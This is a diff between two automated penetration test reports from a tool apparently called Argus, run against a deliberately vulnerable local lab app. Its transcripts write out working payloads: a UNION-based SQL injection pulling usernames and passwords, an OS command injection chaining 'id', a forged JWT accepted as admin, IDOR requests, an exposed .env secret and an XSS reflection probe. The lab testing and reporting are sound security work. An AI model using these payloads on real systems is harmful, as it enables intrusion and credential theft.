@@ -1,8 +1,8 @@
-# Penetration Test Report - 20261115-221817-127.0.0.1
+# Penetration Test Report - 20261116-043207-127.0.0.1
 
-- **Target:** `127.0.0.1` (20261115-221817-127.0.0.1)
-- **Date:** 2026-11-15 22:18:17
-- **Duration:** 2.9s
+- **Target:** `127.0.0.1` (20261116-043207-127.0.0.1)
+- **Date:** 2026-11-16 04:32:07
+- **Duration:** 3.0s
 - **Agent model:** scripted-demo
 - **Model cost:** not priced - model is not in models.json; no price to apply
 - **Argus version:** 1.0.0
@@ -47,7 +47,7 @@ Demo run. Proven: SQL injection (engine named plus five rows from users), OS com
 - **Category:** sqli · **proof: proven**
 - **CWE:** `CWE-89`
 - **OWASP:** A03 Injection
-- **Endpoint:** `http://127.0.0.1:44939/item?id=1`
+- **Endpoint:** `http://127.0.0.1:43673/item?id=1`
 - **Evidence:** r1, r2, r15
 
 **Description**  
@@ -73,11 +73,11 @@ _Requirement for sqli:_ the DBMS fingerprint plus at least one row from a named 
 - [x] rows returned, not an error message - quoted from r15
 - [x] extraction stayed minimal
 
-<details><summary>Transcript r1: GET http://127.0.0.1:44939/item?id=1 -> 200</summary>
+<details><summary>Transcript r1: GET http://127.0.0.1:43673/item?id=1 -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/item?id=1
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/item?id=1
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -85,7 +85,7 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:17 GMT
+date: Mon, 16 Nov 2026 09:32:07 GMT
 content-type: text/html; charset=utf-8
 x-powered-by: LabVuln/1.0
 content-length: 58
@@ -94,11 +94,11 @@ content-length: 58
 ```
 </details>
 
-<details><summary>Transcript r2: GET http://127.0.0.1:44939/item?id=1%27 -> 500</summary>
+<details><summary>Transcript r2: GET http://127.0.0.1:43673/item?id=1%27 -> 500</summary>
 
 ```http
-GET http://127.0.0.1:44939/item?id=1%27
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/item?id=1%27
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -106,7 +106,7 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/500
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:17 GMT
+date: Mon, 16 Nov 2026 09:32:07 GMT
 content-type: text/html; charset=utf-8
 x-powered-by: LabVuln/1.0
 content-length: 102
@@ -115,11 +115,11 @@ content-length: 102
 ```
 </details>
 
-<details><summary>Transcript r15: GET http://127.0.0.1:44939/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+- -> 200</summary>
+<details><summary>Transcript r15: GET http://127.0.0.1:43673/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+- -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+-
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/item?id=1%27+UNION+SELECT+username%2C+password+FROM+users+LIMIT+5--+-
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -127,7 +127,7 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:18 GMT
+date: Mon, 16 Nov 2026 09:32:07 GMT
 content-type: text/html; charset=utf-8
 x-powered-by: LabVuln/1.0
 content-length: 139
@@ -143,7 +143,7 @@ content-length: 139
 - **Category:** rce · **proof: proven**
 - **CWE:** `CWE-78`
 - **OWASP:** A03 Injection
-- **Endpoint:** `http://127.0.0.1:44939/ping?host=127.0.0.1`
+- **Endpoint:** `http://127.0.0.1:43673/ping?host=127.0.0.1`
 - **Evidence:** r18
 
 **Description**  
@@ -165,14 +165,15 @@ _Requirement for rce:_ the output of `id; echo <nonce>` returned by the target, 
 - [x] the target produced the quoted bytes - from r18
 - [x] a benign command was sent - exchange r18
 - [x] identity output returned by the target - 'uid=1000(kali)' in r18
-- [x] the probe nonce came back in the output - 'argusduvor2lu' in r18
+- [x] the quoted bytes are the command output - 'uid=1000(kali)' carries the identity line
+- [x] the probe nonce came back in the output - 'argus9afhlg6f' in r18
 - [x] proof command stayed benign
 
-<details><summary>Transcript r18: GET http://127.0.0.1:44939/ping?host=127.0.0.1%3B+id%3B+echo+argusduvor2lu -> 200</summary>
+<details><summary>Transcript r18: GET http://127.0.0.1:43673/ping?host=127.0.0.1%3B+id%3B+echo+argus9afhlg6f -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/ping?host=127.0.0.1%3B+id%3B+echo+argusduvor2lu
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/ping?host=127.0.0.1%3B+id%3B+echo+argus9afhlg6f
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -180,7 +181,7 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:18 GMT
+date: Mon, 16 Nov 2026 09:32:08 GMT
 content-type: text/html; charset=utf-8
 x-powered-by: LabVuln/1.0
 content-length: 337
@@ -188,7 +189,7 @@ content-length: 337
 <html><body><pre>PING 127.0.0.1: 4 packets, 0% loss
 uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),104(kvm),106(netdev),111(bluetooth),117(scanner),140(wireshark),142(kaboxer),143(docker),1004(devTeam)
 
-argusduvor2lu</pre></body></html>
+argus9afhlg6f</pre></body></html>
 ```
 </details>
 
@@ -199,7 +200,7 @@ argusduvor2lu</pre></body></html>
 - **Category:** jwt · **proof: proven**
 - **CWE:** `CWE-347`
 - **OWASP:** A02 Cryptographic Failures
-- **Endpoint:** `http://127.0.0.1:44939/api/me`
+- **Endpoint:** `http://127.0.0.1:43673/api/me`
 - **Evidence:** r64, r63, r62
 
 **Description**  
@@ -223,11 +224,11 @@ _Requirement for jwt:_ a credential this system minted, accepted on a privileged
 - [x] a forged credential was accepted - 127.0.0.1/api/me returned 200 with a credential
 - [x] the same endpoint refuses another credential - 127.0.0.1/api/me answered 401 to a credentialed request
 
-<details><summary>Transcript r64: GET http://127.0.0.1:44939/api/me -> 401</summary>
+<details><summary>Transcript r64: GET http://127.0.0.1:43673/api/me -> 401</summary>
 
 ```http
-GET http://127.0.0.1:44939/api/me
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/api/me
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -236,7 +237,7 @@ authorization: Bearer •••redacted•••
 
 HTTP/401
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:20 GMT
+date: Mon, 16 Nov 2026 09:32:10 GMT
 content-type: application/json
 x-powered-by: LabVuln/1.0
 content-length: 22
@@ -245,11 +246,11 @@ content-length: 22
 ```
 </details>
 
-<details><summary>Transcript r63: GET http://127.0.0.1:44939/api/me -> 200</summary>
+<details><summary>Transcript r63: GET http://127.0.0.1:43673/api/me -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/api/me
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/api/me
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -258,12 +259,12 @@ authorization: Bearer •••redacted•••
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:20 GMT
+date: Mon, 16 Nov 2026 09:32:10 GMT
 content-type: application/json
 x-powered-by: LabVuln/1.0
 content-length: 93
 
-{"ok": true, "claims": {"sub": "alice", "role": "admin", "iat": 1794799097, "user": "admin"}}
+{"ok": true, "claims": {"sub": "alice", "role": "admin", "iat": 1794821527, "user": "admin"}}
 ```
 </details>
 
@@ -274,7 +275,7 @@ content-length: 93
 - **Category:** idor · **proof: proven**
 - **CWE:** `CWE-639`
 - **OWASP:** A01 Broken Access Control
-- **Endpoint:** `http://127.0.0.1:44939/api/user/2`
+- **Endpoint:** `http://127.0.0.1:43673/api/user/2`
 - **Evidence:** r20, r22
 
 **Description**  
@@ -299,11 +300,11 @@ _Requirement for idor:_ one actor reaching another's subject on the same endpoin
 - [x] the data identifies a subject
 - [x] the caller was not entitled to it - no credential was presented and subject data came back
 
-<details><summary>Transcript r20: GET http://127.0.0.1:44939/api/user/2 -> 200</summary>
+<details><summary>Transcript r20: GET http://127.0.0.1:43673/api/user/2 -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/api/user/2
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/api/user/2
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -311,7 +312,7 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:18 GMT
+date: Mon, 16 Nov 2026 09:32:08 GMT
 content-type: application/json
 x-powered-by: LabVuln/1.0
 content-length: 74
@@ -320,11 +321,11 @@ content-length: 74
 ```
 </details>
 
-<details><summary>Transcript r22: GET http://127.0.0.1:44939/api/user/1 -> 200</summary>
+<details><summary>Transcript r22: GET http://127.0.0.1:43673/api/user/1 -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/api/user/1
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/api/user/1
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -332,7 +333,7 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:18 GMT
+date: Mon, 16 Nov 2026 09:32:08 GMT
 content-type: application/json
 x-powered-by: LabVuln/1.0
 content-length: 75
@@ -341,14 +342,14 @@ content-length: 75
 ```
 </details>
 
-### F05 - Exposed /.env and /.git/HEAD at web root
+### F05 - Exposed /.env at web root
 
 - **Severity:** Medium
 - **CVSS:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`
 - **Category:** info-disclosure · **proof: proven**
 - **CWE:** `CWE-200`
 - **OWASP:** A01 Broken Access Control
-- **Endpoint:** `http://127.0.0.1:44939/.env`
+- **Endpoint:** `http://127.0.0.1:43673/.env`
 - **Evidence:** r27
 
 **Description**  
@@ -371,11 +372,11 @@ _Requirement for disclosure:_ the credential or source observed in a response, q
 - [x] a credential-shaped secret was observed - SECRET_KEY=lab-secret-01...
 - [x] it came from a response, not from the request - in r27
 
-<details><summary>Transcript r27: GET http://127.0.0.1:44939/.env -> 200</summary>
+<details><summary>Transcript r27: GET http://127.0.0.1:43673/.env -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/.env
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/.env
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -383,7 +384,7 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:18 GMT
+date: Mon, 16 Nov 2026 09:32:08 GMT
 content-type: text/plain
 x-powered-by: LabVuln/1.0
 content-length: 67
@@ -402,7 +403,7 @@ SECRET_KEY=lab-secret-0123
 - **Category:** xss · **proof: candidate**
 - **CWE:** `CWE-79`
 - **OWASP:** A03 Injection
-- **Endpoint:** `http://127.0.0.1:44939/search?q=x`
+- **Endpoint:** `http://127.0.0.1:43673/search?q=x`
 - **Evidence:** r19
 
 **Description**  
@@ -423,13 +424,13 @@ _Requirement for xss:_ a headless browser executing the payload and reporting th
 - [x] proof read from the wire
 - [x] the target produced the quoted bytes
 - [x] payload reflected unencoded into HTML - '<>"\'' survived into r19
-- [ ] a real browser executed it - this system has no browser, so execution is not provable here. Drive one over mcp_call and cite the nonce it reports, or leave this a candidate and say so in the report
+- [ ] a real browser executed it - no callback carrying a probe nonce is cited. Reflection is visible in the bytes; execution is not. `agent-browser` is not on PATH. It is an external tool, like sqlmap and nuclei - `npm i -g agent-browser`, or set AGENT_BROWSER_BIN to a local install. Without it a reflected payload can be shown to reflect but not to execute.
 
-<details><summary>Transcript r19: GET http://127.0.0.1:44939/search?q=xc8wionte%3C%3E%27%22%26%3D%2F -> 200</summary>
+<details><summary>Transcript r19: GET http://127.0.0.1:43673/search?q=xquq4gcb7%3C%3E%27%22%26%3D%2F -> 200</summary>
 
 ```http
-GET http://127.0.0.1:44939/search?q=xc8wionte%3C%3E%27%22%26%3D%2F
-host: 127.0.0.1:44939
+GET http://127.0.0.1:43673/search?q=xquq4gcb7%3C%3E%27%22%26%3D%2F
+host: 127.0.0.1:43673
 accept: */*
 accept-encoding: gzip, deflate, br, zstd
 connection: keep-alive
@@ -437,12 +438,12 @@ user-agent: Argus/1.0 (authorized pentest)
 
 HTTP/200
 server: LabVuln/1.0 Python/3.14.6
-date: Mon, 16 Nov 2026 03:18:18 GMT
+date: Mon, 16 Nov 2026 09:32:08 GMT
 content-type: text/html; charset=utf-8
 x-powered-by: LabVuln/1.0
 content-length: 55
 
-<html><body>Results for: xc8wionte<>'"&=/</body></html>
+<html><body>Results for: xquq4gcb7<>'"&=/</body></html>
 ```
 </details>
 
@@ -483,7 +484,7 @@ content-length: 55
 - `GET /api/user/1`
 - `GET /api/user/2`
 - `GET /api/user/3`
-- `GET /arg404kgkpnq4w`
+- `GET /arg404lsp11kfv`
 - `GET /backup.zip`
 - `GET /composer.json`
 - `GET /console`
@@ -511,6 +512,17 @@ content-length: 55
 - `GET /web.config`
 - `GET /wp-config.php~`
 
+
+### Open proof gaps (3)
+
+These were probed and neither proved nor ruled out. They are **not** clean results: a probe that found nothing is only evidence of absence for a class whose negative is conclusive, and the matrix names those explicitly (`ruled_out_by`). Everything else that came back empty is listed here rather than dropped.
+
+| Endpoint | Class | Requests | Why it is not an answer |
+|---|---|---|---|
+| `127.0.0.1/.git/HEAD` | `disclosure` | 1 | settled only by: the endpoint does not serve it (401/403/404) |
+| `127.0.0.1/debug` | `disclosure` | 1 | settled only by: the endpoint does not serve it (401/403/404) |
+| `127.0.0.1/reset` | `xfh` | 1 | the matrix records no negative that settles this class |
+
 ## Methodology
 
 Autonomous agent run: recon (fingerprint, crawl, js_recon) -> input
@@ -531,7 +543,7 @@ recorded transcript at write time._
 <details><summary>Appendix: agent working notes (audit)</summary>
 
 ```
-# Working notes - http://127.0.0.1:44939
+# Working notes - http://127.0.0.1:43673
 
 ## Agent summary (agent)
 
